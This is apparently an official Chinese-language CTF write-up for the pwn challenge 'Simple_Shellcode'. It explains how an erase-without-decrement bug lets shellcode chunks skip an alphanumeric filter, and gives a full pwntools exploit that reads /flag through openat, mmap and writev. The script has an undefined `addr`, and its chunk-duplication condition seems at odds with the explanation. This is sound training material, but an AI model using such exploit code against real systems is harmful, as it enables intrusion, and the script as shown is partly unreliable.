# Simple_Shellcode

> 分类：Pwn

## 题目描述
程序有两个功能：一是输入 shellcode，二是运行 shellcode。shellcode 存储在一个 `std::vector<std::string>` 中，一次只能输入 8 个字符，且检测 shellcode 是否含有非字母数字字符，若含则删除该段。

## 考察知识点
- Shellcode 编写（沙箱绕过）
- 逻辑漏洞：`erase` 后未 `i--` 导致相邻元素绕过检测
- AE64（字母数字 shellcode）或绕过非字母数字检测
- openat + mmap + writev 读取 flag

## 解法
检测逻辑中，若某段 shellcode 含非字母数字，则 `code.erase(code.begin() + i)` 删除。但删除后没有执行 `i--`，导致 `erase` 会把后面的元素 MOVE 到前面，使得原本位于 `idx+1` 的元素被移动到 `idx` 并绕过本次检测。因此把"会被删除的元素"连续输入两次即可绕过检测。

对沙箱使用 openat + mmap + writev 读取 `/flag`。

EXP：

```python
#!/usr/bin/env python3
from pwn import *
import re

context(log_level='debug', arch='amd64', os='linux')
context.terminal = ["tmux", "splitw", "-h"]
uu64 = lambda x: u64(x.ljust(8, b'\x00'))
s = lambda x: p.send(x)
sa = lambda x, y: p.sendafter(x, y)
sl = lambda x: p.sendline(x)
sla = lambda x, y: p.sendlineafter(x, y)
ru = lambda x: p.recvuntil(x)

k = 1
if k:
    host = addr.split(':')
    p = remote(host[0], host[1])
else:
    p = process('./Simple_Shellcode')
elf = ELF('./Simple_Shellcode')

def debug():
    gdb.attach(p, 'b *$rebase(0x3F50)\nc\n')

def sp_input(byte_str):
    for i in range(0, len(byte_str), 8):
        chunk = byte_str[i : i + 8]

        input(chunk)

        if re.search(rb'[a-zA-Z0-9]', chunk):
            input(chunk)

def input(data):
    sla(b'Choose', b'1')
    sl(data)

def run_code():
    sla(b'Choose', b'2')

shellcode = '''
    mov rsp, rbp
'''
shellcode += shellcraft.openat(-100, "/flag", 0, 0)
shellcode += '''
    mov rdi, 0x777721000
    mov rsi, 0x100
    mov rdx, 1
    mov r10, 2
    mov r8, 3
    mov r9, 0
    mov rax, 9
    syscall
    push 1
    pop rdi
    push 0x1    /* iov size */
    pop rdx
    push 0x100
    mov rbx, 0x777721000
    push rbx
    mov rsi, rsp
    push SYS_writev
    pop rax
    syscall
'''

payload = asm(shellcode)

sp_input(payload)
run_code()

p.interactive()
```

## 参考答案
（未给出）

## 来源
- 作者：NewStar CTF 2024 官方 WriteUp | https://newstar.wiki/wp/2024/week5/pwn/simple_shellcode.html
